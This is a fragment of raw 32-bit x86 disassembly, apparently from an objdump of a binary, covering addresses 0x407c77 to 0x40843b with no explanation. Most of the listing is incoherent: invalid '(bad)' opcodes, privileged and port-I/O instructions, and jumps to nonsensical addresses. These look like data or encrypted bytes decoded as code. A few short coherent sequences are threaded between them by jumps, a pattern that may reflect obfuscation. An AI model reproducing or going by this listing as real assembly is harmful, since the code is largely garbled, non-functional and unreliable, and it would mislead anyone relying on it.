  407c77:	rol    DWORD PTR [ebx+eax*4],0x70
  407c7b:	jmp    0xbc673cfc
  407c80:	push   0x1c
  407c82:	lods   al,BYTE PTR ds:[esi]
  407c83:	cdq    
  407c84:	sub    esi,esp
  407c86:	jne    0x407c17
  407c88:	sub    dh,bh
  407c8a:	and    DWORD PTR [edx-0x2a7d2b97],edx
  407c90:	neg    dl
  407c92:	or     BYTE PTR [edi],bl
  407c94:	jmp    0x1e15e151
  407c99:	mov    bh,0x4d
  407c9b:	in     eax,dx
  407c9c:	mov    edx,0x28514a5b
  407ca1:	cmp    ebx,DWORD PTR [edi+0x1c5c4d99]
  407ca7:	js     0x407d19
  407ca9:	das    
  407caa:	ins    BYTE PTR es:[edi],dx
  407cab:	in     al,0x98
  407cad:	mov    esp,0xf833d033
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x6367b216]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407c7d
  407ce1:	sbb    ecx,DWORD PTR [ebx]
  407ce3:	sbb    ebp,ebp
  407ce5:	mov    cl,0xb0
  407ce7:	jb     0x407caf
  407ce9:	aam    0x3e
  407ceb:	xchg   esp,eax
  407cec:	xor    BYTE PTR [ecx],al
  407cee:	bound  esi,QWORD PTR [edi]
  407cf0:	pop    ecx
  407cf1:	jmp    0x39a28b20
  407cf6:	test   al,0xd2
  407cf8:	in     eax,0x36
  407cfa:	mov    ah,BYTE PTR [edi-0x2bc420e0]
  407d00:	sub    ch,BYTE PTR [esi-0x7]
  407d03:	or     eax,0x16bbdf64
  407d08:	push   ebx
  407d09:	or     dh,BYTE PTR [ebx]
  407d0b:	in     al,dx
  407d0c:	sbb    al,0x66
  407d0e:	sub    ecx,DWORD PTR [edi+edx*8+0x6b]
  407d12:	dec    ebx
  407d13:	mov    al,ds:0x3ca28035
  407d18:	ret    0xab5
  407d1b:	popa   
  407d1c:	mov    edx,0x2c9fc521
  407d21:	ficomp DWORD PTR [edi+0x57c85c29]
  407d27:	xchg   esi,eax
  407d28:	xchg   ebp,eax
  407d29:	mov    bl,0xdd
  407d2b:	jp     0x407cd2
  407d2d:	icebp  
  407d2e:	jl     0x407d96
  407d30:	retf   0xeaa7
  407d33:	das    
  407d34:	mov    dh,0xc9
  407d36:	mov    ah,0xf2
  407d38:	sub    DWORD PTR [ebp+ecx*8-0x649c2f5a],esi
  407d3f:	hlt    
  407d40:	inc    esi
  407d41:	mov    ah,0x6
  407d43:	enter  0xbd7f,0x3d
  407d47:	pop    es
  407d48:	cli    
  407d49:	or     al,0x1d
  407d4b:	jmp    0x407d47
  407d4d:	push   eax
  407d4e:	push   edx
  407d4f:	pushf  
  407d50:	add    DWORD PTR [eax-0x24bd6745],edi
  407d56:	imul   ebp,DWORD PTR [ecx-0x462b8855],0xc
  407d5d:	pop    ebp
  407d5e:	sub    BYTE PTR [edx],dh
  407d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d61:	inc    eax
  407d62:	(bad)  
  407d63:	xchg   ebp,eax
  407d64:	fist   WORD PTR [edi+esi*8]
  407d67:	and    dl,BYTE PTR [edx-0x7c]
  407d6a:	ror    eax,cl
  407d6c:	adc    bl,BYTE PTR [edi]
  407d6e:	aad    0xa1
  407d70:	loop   0x407d97
  407d72:	adc    al,0x89
  407d74:	or     cl,BYTE PTR [ebx]
  407d76:	push   cs
  407d77:	xchg   edx,eax
  407d78:	ss mov dh,0x3f
  407d7b:	cdq    
  407d7c:	mov    esi,es
  407d7e:	(bad)  
  407d7f:	or     al,0xa8
  407d81:	hlt    
  407d82:	iret   
  407d83:	arpl   si,si
  407d85:	test   BYTE PTR [esi],bh
  407d87:	sbb    DWORD PTR [esi],0x5eb72824
  407d8d:	rcl    BYTE PTR [edi-0x68],cl
  407d90:	inc    ebp
  407d91:	call   0xcd6d:0x641f5b5
  407d98:	cmp    BYTE PTR [eax],cl
  407d9a:	stc    
  407d9b:	and    al,0x2e
  407d9d:	loop   0x407e04
  407d9f:	jae    0x407d2c
  407da1:	xor    dl,ch
  407da3:	inc    edx
  407da4:	pop    ebp
  407da5:	add    ebx,DWORD PTR [esp+ebx*4]
  407da8:	cdq    
  407da9:	xchg   ebx,eax
  407daa:	inc    esi
  407dab:	mov    ds:0x2b72fa67,al
  407db0:	out    0x9a,al
  407db2:	and    DWORD PTR [eax+ebx*1+0x496db856],ebp
  407db9:	stos   BYTE PTR es:[edi],al
  407dba:	test   al,0x9e
  407dbc:	sahf   
  407dbd:	cwde   
  407dbe:	pusha  
  407dbf:	mov    ch,0x7b
  407dc1:	sbb    edi,edx
  407dc3:	les    ebx,FWORD PTR [edx-0x6c42027c]
  407dc9:	add    edi,DWORD PTR ds:0x5fe9ad1b
  407dcf:	scas   eax,DWORD PTR es:[edi]
  407dd0:	push   ds
  407dd1:	mov    al,ds:0xa1a71b1f
  407dd6:	xor    al,0x37
  407dd8:	xor    ah,BYTE PTR [esi-0x67]
  407ddb:	out    dx,al
  407ddc:	sub    DWORD PTR [edi+0x75],eax
  407ddf:	push   ebx
  407de0:	fbld   TBYTE PTR [ebx+eiz*1+0x5c]
  407de4:	pop    ds
  407de5:	pop    ebp
  407de6:	sub    al,0x48
  407de8:	inc    ebx
  407de9:	mov    ds:0xdbcd5545,al
  407dee:	test   DWORD PTR [eax+0x575a08f6],ebx
  407df4:	mov    ecx,0xc4787af5
  407df9:	xor    bh,BYTE PTR [esi+0x7e03b229]
  407dff:	push   edx
  407e00:	xchg   BYTE PTR [ebx+0x78],al
  407e03:	jg     0x407da6
  407e05:	dec    DWORD PTR [esi+0x11]
  407e08:	jl     0x407dcf
  407e0a:	mov    al,ds:0x5d8d59e1
  407e0f:	(bad)  
  407e10:	sbb    al,0xb5
  407e12:	mov    cr0,eax
  407e15:	mov    dl,bh
  407e17:	xor    bh,BYTE PTR [ebx+0x5f]
  407e1a:	push   esi
  407e1b:	(bad)  
  407e1c:	mov    dl,0xfc
  407e1e:	inc    ebp
  407e1f:	add    al,0x86
  407e21:	jne    0x407dfc
  407e23:	ins    DWORD PTR es:[edi],dx
  407e24:	pop    ds
  407e25:	in     al,dx
  407e26:	in     al,0x87
  407e28:	add    eax,0x29209896
  407e2d:	scas   al,BYTE PTR es:[edi]
  407e2e:	pusha  
  407e2f:	ret    0xc9
  407e32:	push   cs
  407e33:	jno    0x407e89
  407e35:	mov    esp,0xb49dc68e
  407e3a:	mov    esi,0xb240ca8
  407e3f:	rcl    DWORD PTR [edi+0x35a560c6],0xfd
  407e46:	mov    esp,0xf1dd5e2e
  407e4b:	hlt    
  407e4c:	dec    ecx
  407e4d:	pop    es
  407e4e:	pop    esp
  407e4f:	xor    bh,BYTE PTR [esi-0x491788ef]
  407e55:	mov    ah,0x4
  407e57:	pop    edi
  407e58:	pop    es
  407e59:	xchg   ebx,eax
  407e5a:	xchg   ecx,eax
  407e5b:	jno    0x407e08
  407e5d:	xor    eax,0x5603a764
  407e62:	sbb    BYTE PTR [eax+eax*4],0x6a
  407e66:	xor    DWORD PTR [edi-0x3ea23f5c],esi
  407e6c:	push   esp
  407e6d:	adc    dh,0x4c
  407e70:	push   esi
  407e71:	xchg   ecx,eax
  407e72:	jecxz  0x407e3a
  407e74:	ja     0x407e82
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	push   esi
  407e9e:	lahf   
  407e9f:	test   al,0xa7
  407ea1:	adc    ebp,ecx
  407ea3:	jle    0x407f23
  407ea5:	mov    bh,BYTE PTR [edi+0x7e]
  407ea8:	jle    0x407e66
  407eaa:	popf   
  407eab:	pop    ss
  407eac:	dec    ecx
  407ead:	or     edx,esp
  407eaf:	fsub   QWORD PTR [edx+esi*2+0xd]
  407eb3:	inc    DWORD PTR [eax-0x2]
  407eb6:	(bad)  
  407eb7:	daa    
  407eb8:	imul   ebx,edi,0xffffff90
  407ebb:	ficom  DWORD PTR [eax]
  407ebd:	jns    0x407ecc
  407ebf:	and    BYTE PTR [ebx+eax*1-0xa],ch
  407ec3:	loope  0x407e91
  407ec5:	retf   0xd88
  407ec8:	in     eax,dx
  407ec9:	mov    ecx,ebp
  407ecb:	mov    al,ds:0x59ecbc10
  407ed0:	add    edx,ebp
  407ed2:	xchg   ecx,eax
  407ed3:	int    0x19
  407ed5:	jne    0x407f33
  407ed7:	or     BYTE PTR [ecx-0x680ef65b],cl
  407edd:	mov    al,ds:0x7f628d12
  407ee2:	cmp    al,BYTE PTR [edi-0x4]
  407ee5:	ds mov cl,0xac
  407ee8:	lock sub DWORD PTR [ebp+0x24f4dac4],eax
  407eef:	jo     0x407f1d
  407ef1:	loope  0x407eae
  407ef3:	or     al,0x92
  407ef5:	data16 clc 
  407ef7:	pop    ebp
  407ef8:	add    al,0x24
  407efa:	scas   eax,DWORD PTR es:[edi]
  407efb:	mov    ch,0x22
  407efd:	data16 addr16 into 
  407f00:	out    dx,al
  407f01:	dec    ecx
  407f02:	and    BYTE PTR [esi+0x72327f5c],dl
  407f08:	nop
  407f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f0a:	sub    dh,BYTE PTR [eax]
  407f0c:	call   0x654f03b2
  407f11:	(bad)  
  407f13:	sub    DWORD PTR [esi-0xc],0x8dcfa2ad
  407f1a:	(bad)  
  407f1b:	icebp  
  407f1c:	jmp    ebx
  407f1e:	wrmsr  
  407f20:	shl    BYTE PTR [esi],cl
  407f22:	repz aad 0xa4
  407f25:	out    dx,eax
  407f26:	out    dx,eax
  407f27:	pop    ebx
  407f28:	sub    DWORD PTR [ebp+0x10efc558],0x17cf2eef
  407f32:	xchg   ebp,eax
  407f33:	popf   
  407f34:	out    dx,al
  407f35:	icebp  
  407f36:	fs ins DWORD PTR es:[edi],dx
  407f38:	jmp    0x6fc4a757
  407f3d:	scas   al,BYTE PTR es:[edi]
  407f3e:	(bad)  
  407f3f:	pushf  
  407f40:	cmp    DWORD PTR [edx+0x2beb6d18],edx
  407f46:	dec    edx
  407f47:	jecxz  0x407f24
  407f49:	inc    ecx
  407f4a:	push   ebx
  407f4b:	ret    0xa318
  407f4e:	fld    DWORD PTR [esp+eiz*4-0x4b]
  407f52:	cwde   
  407f53:	loopne 0x407eee
  407f55:	ret    
  407f56:	std    
  407f57:	popf   
  407f58:	das    
  407f59:	sbb    esp,esp
  407f5b:	mov    al,0x22
  407f5d:	xchg   DWORD PTR [edi+0x28],edx
  407f60:	or     dh,bh
  407f62:	xchg   esp,eax
  407f63:	inc    ebx
  407f64:	jmp    0x58d3:0xc9eea652
  407f6b:	or     ebx,DWORD PTR [edi+0x33]
  407f6e:	test   BYTE PTR [ecx-0x11],al
  407f71:	repnz mov ecx,0xd16647d4
  407f77:	test   DWORD PTR [ecx],0x8126b92e
  407f7d:	enter  0x7a45,0x20
  407f81:	popf   
  407f82:	retf   
  407f83:	pop    es
  407f84:	fcomp  DWORD PTR [esi]
  407f86:	mov    cl,0xbd
  407f88:	outs   dx,DWORD PTR ds:[esi]
  407f89:	call   0x742e:0x7bcfb3ca
  407f90:	or     bl,BYTE PTR [eax+0x26860949]
  407f96:	jb     0x40800e
  407f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f99:	dec    ecx
  407f9a:	pop    ss
  407f9b:	cli    
  407f9c:	push   ebp
  407f9d:	adc    eax,0x78899363
  407fa2:	dec    ecx
  407fa3:	scas   eax,DWORD PTR es:[edi]
  407fa4:	repnz xchg esi,eax
  407fa6:	mov    ds:0xed0d3480,eax
  407fab:	xor    BYTE PTR [ebp-0x3ad2ea2b],0xd9
  407fb2:	cs mov ebx,0xddc666
  407fb8:	cmp    al,0xfd
  407fba:	xchg   edx,eax
  407fbb:	mov    dh,0x21
  407fbd:	xchg   esi,eax
  407fbe:	push   ecx
  407fbf:	inc    edx
  407fc0:	push   cs
  407fc1:	shr    BYTE PTR [eax-0x43],cl
  407fc4:	mov    gs,WORD PTR [esi]
  407fc6:	xchg   DWORD PTR [ebx*4-0x96a6bba],edi
  407fcd:	or     edx,DWORD PTR [ebp+eiz*8+0xd]
  407fd1:	fiadd  DWORD PTR gs:[ebx]
  407fd4:	inc    DWORD PTR [ecx+0x76]
  407fd7:	sbb    BYTE PTR [eax+esi*2+0x43bbc35a],0x6c
  407fdf:	mov    ch,0x9f
  407fe1:	mov    ds:0x1e301174,al
  407fe6:	iret   
  407fe7:	into   
  407fe8:	xchg   WORD PTR [eax-0x74],bx
  407fec:	clc    
  407fed:	mov    esi,es
  407fef:	lock cmp dh,ah
  407ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ff3:	loop   0x407ffd
  407ff5:	out    0xbd,eax
  407ff7:	push   ecx
  407ff8:	inc    eax
  407ff9:	out    0xe7,eax
  407ffb:	sbb    esi,esi
  407ffd:	add    bl,BYTE PTR [esi-0x2]
  408000:	(bad)  
  408001:	xchg   ebx,eax
  408002:	add    al,0xa0
  408004:	xchg   ecx,eax
  408005:	cmp    ebx,ebp
  408007:	jl     0x40803a
  408009:	jne    0x407fd5
  40800b:	imul   eax,DWORD PTR [edi],0xdc7d98bc
  408011:	add    ebp,edx
  408013:	retf   0xa9f4
  408016:	cmp    bl,BYTE PTR [eax]
  408018:	jne    0x407faf
  40801a:	mov    bh,0xa5
  40801c:	inc    eax
  40801d:	adc    BYTE PTR ds:0xfbf52de6,ch
  408023:	adc    edi,DWORD PTR [eax+0x2048dd5f]
  408029:	aaa    
  40802a:	jecxz  0x408082
  40802c:	cmp    al,ah
  40802e:	mov    al,0x1c
  408030:	sub    BYTE PTR [esi-0x2c],cl
  408033:	(bad)  
  408034:	lahf   
  408035:	sbb    al,0x74
  408037:	jne    0x407fcc
  408039:	push   esi
  40803a:	mov    ecx,0xf903ca96
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	mov    edx,0xadcd9b3c
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x4080de
  408086:	pop    ecx
  408087:	(bad)  
  408088:	ds cmp eax,0x5c453a05
  40808e:	fst    QWORD PTR cs:[edi-0x5f]
  408092:	repz sbb edi,DWORD PTR [edi-0x50f49ed9]
  408099:	cmp    cl,BYTE PTR [eax+0x5b]
  40809c:	out    0xad,eax
  40809e:	ins    BYTE PTR es:[edi],dx
  40809f:	stc    
  4080a0:	mov    DWORD PTR ds:0xec9a34e,eax
  4080a6:	dec    ecx
  4080a7:	inc    ebx
  4080a8:	lock gs das 
  4080ab:	xchg   edi,eax
  4080ac:	iret   
  4080ad:	adc    al,BYTE PTR [ebx+0x3b1d8dec]
  4080b3:	das    
  4080b4:	popa   
  4080b5:	(bad)  
  4080b6:	(bad)  
  4080b7:	cmp    BYTE PTR ds:0x269cb7c4,bh
  4080bd:	sbb    al,0x55
  4080bf:	push   ecx
  4080c0:	inc    esp
  4080c1:	inc    eax
  4080c2:	fdiv   st(4),st
  4080c4:	pusha  
  4080c5:	arpl   WORD PTR [edx],bp
  4080c7:	mov    edi,0x1f29fb1
  4080cc:	push   0xf
  4080ce:	pushf  
  4080cf:	adc    DWORD PTR [ecx],esp
  4080d1:	xor    eax,0xd668408e
  4080d6:	daa    
  4080d7:	lods   eax,DWORD PTR ds:[esi]
  4080d8:	mov    ebp,0x4b8517b6
  4080dd:	repnz arpl WORD PTR [edi+0x4115f240],sp
  4080e4:	dec    esp
  4080e5:	(bad)  
  4080e7:	(bad)  
  4080e8:	outs   dx,BYTE PTR ds:[esi]
  4080e9:	pop    esp
  4080ea:	iret   
  4080eb:	cmp    DWORD PTR [edi+0x4eb709a2],ebx
  4080f1:	ja     0x4080f7
  4080f3:	ja     0x40811b
  4080f5:	push   esi
  4080f6:	retf   
  4080f7:	enter  0x13a2,0x11
  4080fb:	xchg   esi,eax
  4080fc:	repnz mov WORD PTR [eax+edi*8],es
  408100:	pop    esp
  408101:	pop    esp
  408102:	iret   
  408103:	imul   esi,DWORD PTR [eax-0x76],0xb
  408107:	mov    WORD PTR [edi+0x2e31429],ds
  40810d:	mov    edx,ss
  40810f:	adc    bl,ah
  408111:	dec    esi
  408112:	popa   
  408113:	pushf  
  408114:	frstor [ebp-0x250339de]
  40811a:	jl     0x4080fa
  40811c:	mov    esi,0x30f02579
  408122:	cmc    
  408123:	hlt    
  408124:	cmp    al,bl
  408126:	jmp    0xdd9a1680
  40812b:	dec    edx
  40812c:	add    BYTE PTR ds:0xc9b5ca09,al
  408132:	mov    ch,0x86
  408134:	(bad)  
  408135:	mov    al,0xbb
  408137:	repnz out dx,eax
  408139:	or     BYTE PTR [esi+0x5920dea7],cl
  40813f:	add    BYTE PTR [esi+0x1ad8853f],cl
  408145:	out    0x73,al
  408147:	(bad)  
  408148:	bound  ebx,QWORD PTR [ebp-0x4fb41a05]
  40814e:	xchg   edi,eax
  40814f:	mov    ch,0x98
  408151:	add    eax,0xf80c00cb
  408156:	jno    0x408132
  408158:	or     al,0xdc
  40815a:	mov    al,ds:0x7a1ea83f
  40815f:	or     eax,DWORD PTR [eax+0x2]
  408162:	jb     0x408155
  408164:	dec    edi
  408165:	arpl   WORD PTR [edx+ebx*2+0x26],sp
  408169:	mov    ebp,0x489c7c99
  40816e:	data16 shl BYTE PTR [ecx-0x26],0xa
  408173:	sub    ah,ah
  408175:	lahf   
  408176:	retf   
  408177:	fstp   DWORD PTR [edi]
  408179:	cld    
  40817a:	push   cs
  40817b:	stos   DWORD PTR es:[edi],eax
  40817c:	std    
  40817d:	(bad)  
  40817e:	sub    al,0x49
  408180:	mov    esp,0x17620d3f
  408185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408186:	jge    0x408169
  408188:	xchg   ebx,eax
  408189:	and    bh,ch
  40818b:	dec    ecx
  40818c:	cli    
  40818d:	and    BYTE PTR [ebx+0x9],dl
  408190:	mov    al,0x3c
  408192:	aam    0x41
  408194:	fcmovbe st,st(2)
  408196:	xchg   ebx,eax
  408197:	ins    BYTE PTR es:[edi],dx
  408198:	shr    DWORD PTR [ecx-0x6e],cl
  40819b:	mov    eax,ds:0xcc136d1
  4081a0:	mov    bh,0x3f
  4081a2:	cmp    eax,0x3697c49f
  4081a7:	mov    ds:0x3e4da497,eax
  4081ac:	cmp    al,0x92
  4081ae:	mov    ebp,0x999e160a
  4081b3:	out    dx,al
  4081b4:	loope  0x4081d7
  4081b6:	or     bl,BYTE PTR [edi+eax*8+0x7d759519]
  4081bd:	add    al,0xcb
  4081bf:	ret    
  4081c0:	mov    esi,0xc2ef6d56
  4081c5:	mov    eax,0x95904175
  4081ca:	mov    edi,0x4b02eca0
  4081cf:	mov    BYTE PTR [edx+0x650ce045],dl
  4081d5:	cs dec edi
  4081d7:	lods   eax,DWORD PTR ds:[esi]
  4081d8:	jb     0x40820b
  4081da:	lds    esi,FWORD PTR [ebp+0x3f]
  4081dd:	test   bh,al
  4081df:	xchg   ebx,eax
  4081e0:	push   ebx
  4081e1:	mov    dl,0x21
  4081e3:	jmp    0x408255
  4081e5:	mov    dh,0x59
  4081e7:	push   edx
  4081e8:	int3   
  4081e9:	and    ebp,DWORD PTR [edi+edx*8+0x1240d4f3]
  4081f0:	nop
  4081f1:	add    al,0x83
  4081f3:	fwait
  4081f4:	cmp    DWORD PTR cs:[edi-0x129f3b48],edx
  4081fb:	sbb    ch,bh
  4081fd:	adc    ah,0xb2
  408200:	cdq    
  408201:	pop    eax
  408202:	add    eax,DWORD PTR [ecx-0x4917c30b]
  408208:	scas   eax,DWORD PTR es:[edi]
  408209:	jl     0x40821c
  40820b:	xor    DWORD PTR [ecx-0x1d55279],edi
  408211:	sahf   
  408212:	push   esi
  408213:	jb     0x40822f
  408215:	in     eax,dx
  408216:	mov    bl,0x1d
  408218:	rol    BYTE PTR [ebx],0xd1
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x399c:0xbc68d162
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x4082a5
  408239:	adc    BYTE PTR [esi-0x2f],dl
  40823c:	int3   
  40823d:	popf   
  40823e:	mov    BYTE PTR [edi-0x3d],bh
  408241:	dec    ebp
  408242:	mov    dh,0x7b
  408244:	sbb    DWORD PTR [eax+0x40],esi
  408247:	call   0x4a673d40
  40824c:	xchg   DWORD PTR [edx-0x7a7e9901],ebp
  408252:	pop    ebp
  408253:	inc    esp
  408254:	call   0x2aa3:0x89fddc22
  40825b:	repz push ecx
  40825d:	adc    eax,0x4809e6ff
  408262:	sub    ebp,DWORD PTR [ecx-0x65]
  408265:	(bad)  
  408266:	fisttp WORD PTR [edi]
  408268:	test   al,0x1c
  40826a:	jecxz  0x408262
  40826c:	loope  0x408232
  40826e:	fisubr DWORD PTR [ecx-0x6f18c89a]
  408274:	xchg   esi,eax
  408275:	imul   DWORD PTR [ebx+0x29]
  408278:	pop    edx
  408279:	pop    esp
  40827a:	xlat   BYTE PTR ds:[ebx]
  40827b:	jae    0x408243
  40827d:	cmp    BYTE PTR [ebx-0x35f5404d],bl
  408283:	fcomp  DWORD PTR [esi-0x5]
  408286:	pop    eax
  408287:	(bad)  
  408288:	or     edx,ecx
  40828a:	scas   eax,DWORD PTR es:[edi]
  40828b:	jmp    0x40822b
  40828d:	dec    eax
  40828e:	aas    
  40828f:	mov    BYTE PTR [edx-0x3f],cl
  408292:	int3   
  408293:	cdq    
  408294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408295:	rcl    BYTE PTR [ebx],0x10
  408298:	jl     0x408291
  40829a:	sbb    BYTE PTR [ebx+eiz*4],dh
  40829d:	jmp    0x8138:0xcd9e9782
  4082a4:	mov    BYTE PTR [edi-0x2c],ah
  4082a7:	and    eax,DWORD PTR [esi]
  4082a9:	retf   
  4082aa:	or     eax,0x7a63854d
  4082af:	cdq    
  4082b0:	stos   BYTE PTR es:[edi],al
  4082b1:	cld    
  4082b2:	or     ah,BYTE PTR [ebx+0xc0e8161]
  4082b8:	nop
  4082b9:	mov    cl,0x19
  4082bb:	jne    0x40827b
  4082bd:	sbb    eax,0x72efc6dc
  4082c2:	push   esp
  4082c3:	retf   0x3f1b
  4082c6:	sbb    BYTE PTR [edi],ah
  4082c8:	stos   DWORD PTR es:[edi],eax
  4082c9:	inc    edx
  4082ca:	sbb    ah,ch
  4082cc:	ret    0x82de
  4082cf:	mov    esp,0x44f39fd3
  4082d4:	mov    ds:0x78fc2232,al
  4082d9:	retf   0x4cf2
  4082dc:	adc    al,BYTE PTR [ecx+0x4ee158a5]
  4082e2:	fistp  QWORD PTR [ebp+0x21]
  4082e5:	dec    ebp
  4082e6:	(bad)  
  4082e7:	jmp    0xdcc6981a
  4082ec:	mov    edx,0x4da495e
  4082f1:	idiv   WORD PTR [ebx-0x4055f693]
  4082f8:	add    esi,esp
  4082fa:	adc    BYTE PTR [eax],al
  4082fc:	dec    ebx
  4082fd:	shl    BYTE PTR [esi-0x1e],cl
  408300:	pushf  
  408301:	pop    esi
  408302:	xchg   esi,eax
  408303:	inc    ebp
  408304:	dec    edi
  408305:	retf   0x84e6
  408308:	add    al,BYTE PTR [eax+edx*4]
  40830b:	fwait
  40830c:	and    BYTE PTR [edi-0x28],al
  40830f:	lods   al,BYTE PTR ds:[esi]
  408310:	pop    es
  408311:	jnp    0x4082b4
  408313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408314:	rcr    DWORD PTR [edi+0x12],cl
  408317:	in     al,dx
  408318:	int    0x62
  40831a:	push   ebx
  40831b:	mov    dh,bl
  40831d:	fst    QWORD PTR [ebx+0x2d6e71a3]
  408323:	gs scas eax,DWORD PTR es:[edi]
  408325:	pop    ss
  408326:	outs   dx,BYTE PTR ds:[esi]
  408327:	sbb    BYTE PTR [edx-0x15],dh
  40832a:	in     eax,0xa1
  40832c:	cmc    
  40832d:	call   0x29763e23
  408332:	popf   
  408333:	add    al,0x69
  408335:	js     0x4082b8
  408337:	adc    eax,0x670da37c
  40833c:	std    
  40833d:	nop
  40833e:	adc    DWORD PTR [eax-0x5b1846f5],edx
  408344:	xor    DWORD PTR [ecx+0x150761cb],0x881a3ba9
  40834e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40834f:	mov    ah,bh
  408351:	cmp    BYTE PTR [ebx],dh
  408353:	(bad)  
  408354:	iret   
  408355:	push   edi
  408356:	test   DWORD PTR [ebx-0x5f],ecx
  408359:	and    DWORD PTR [esi-0x467babbe],esp
  40835f:	neg    cl
  408361:	and    DWORD PTR [eax+0x46],edx
  408364:	xor    al,0x3c
  408366:	mov    bh,0xbe
  408368:	add    BYTE PTR [edx],ah
  40836a:	rcl    BYTE PTR [edi],0x58
  40836d:	arpl   WORD PTR [edi+0x4e9ea5c3],si
  408373:	pop    esp
  408374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408375:	sub    esi,eax
  408377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408378:	outs   dx,DWORD PTR ds:[esi]
  408379:	push   esp
  40837a:	mov    dh,0xd2
  40837c:	les    edx,FWORD PTR [ebx]
  40837e:	jnp    0x4083fc
  408380:	sbb    cl,dh
  408382:	out    dx,al
  408383:	std    
  408384:	mov    dl,0x6b
  408386:	pushf  
  408387:	sbb    ah,cl
  408389:	mov    ah,0xc
  40838b:	and    al,BYTE PTR ss:[eax-0x2]
  40838f:	setbe  BYTE PTR [eax+eax*1]
  408393:	ret    0xf14d
  408396:	add    eax,0xc2031390
  40839b:	in     al,0x80
  40839d:	(bad)  
  40839e:	jb     0x4083d8
  4083a0:	add    BYTE PTR [ecx],dh
  4083a2:	adc    BYTE PTR [edi],0xba
  4083a5:	mov    BYTE PTR [esi],dh
  4083a7:	push   ebp
  4083a8:	xchg   ebx,eax
  4083a9:	fild   QWORD PTR [ebx+0x2149af2a]
  4083af:	stc    
  4083b0:	xchg   edx,eax
  4083b1:	ins    DWORD PTR es:[edi],dx
  4083b2:	inc    edx
  4083b3:	rol    DWORD PTR [edx+0x17],cl
  4083b6:	addr16 inc eax
  4083b8:	push   es
  4083b9:	mov    al,ds:0x365fbc0a
  4083be:	imul   ebp,DWORD PTR [ebx-0x24b16094],0xffffffe4
  4083c5:	lds    ebx,FWORD PTR [edx+0x1a0ed9b3]
  4083cb:	fmul   QWORD PTR [edi]
  4083cd:	scas   eax,DWORD PTR es:[edi]
  4083ce:	xlat   BYTE PTR ds:[ebx]
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	iret   
  4083e9:	fcom   QWORD PTR [ebx]
  4083eb:	xchg   ecx,eax
  4083ec:	push   ebp
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x408426
  4083f5:	pop    ss
  4083f6:	mov    WORD PTR [eax],cs
  4083f8:	inc    ebx
  4083f9:	jl     0x40846d
  4083fb:	xor    cl,al
  4083fd:	adc    BYTE PTR [ecx],cl
  4083ff:	xchg   BYTE PTR [eax+0x1d13e08e],ah
  408405:	jo     0x408420
  408407:	std    
  408408:	adc    ah,bh
  40840a:	or     BYTE PTR [edi+eax*2],dh
  40840d:	push   edx
  40840e:	mov    bl,0x61
  408410:	repnz sub eax,DWORD PTR [edi-0x2f]
  408414:	mov    ds:0x1a5f2ee8,al
  408419:	cs push ebx
  40841b:	pop    ebx
  40841c:	popf   
  40841d:	psrlw  mm1,mm7
  408420:	xchg   ebp,eax
  408421:	xor    DWORD PTR [ecx+0x1c667c3e],eax
  408427:	rol    BYTE PTR [edx+ebx*2+0x5e21e5cd],cl
  40842e:	in     eax,dx
  40842f:	sahf   
  408430:	ja     0x40842f
  408432:	adc    al,0x2d
  408434:	jo     0x4083e6
  408436:	sub    eax,0xfca84e42
  40843b:	pop    eax
